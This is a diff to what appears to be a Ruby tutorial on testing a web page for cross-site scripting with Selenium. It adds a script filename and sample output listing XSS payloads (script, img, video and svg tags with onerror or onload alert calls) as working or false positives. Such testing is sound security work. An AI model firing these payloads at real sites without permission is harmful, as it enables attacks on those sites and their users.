@@ -88,7 +88,7 @@ Let's test the page against XSS vulnerability. First I'll list what kind of acti
 4. Check if the payload is working or it's false positive 
 5. Print the succeed payloads on terminal
 
-
+**selenium-xss.rb**
 ```ruby
 #!/usr/bin/env ruby
 #
@@ -134,6 +134,18 @@ payloads.each do |payload|
 end
 
 ```
+
+Result
+```
+./selenium-tabs2.rb 
+Payload is working: <video src=x onerror=alert(1);>
+Payload is working: <img src=x onerror='alert(2)'>
+Payload is working: <script>alert(3)</script>
+Payload is working: <svg/OnlOad=prompt(4)>
+False Positive: javascript:alert(5)
+False Positive: alert(/6/.source)
+```
+
 
 
 ## Watir Webdriver
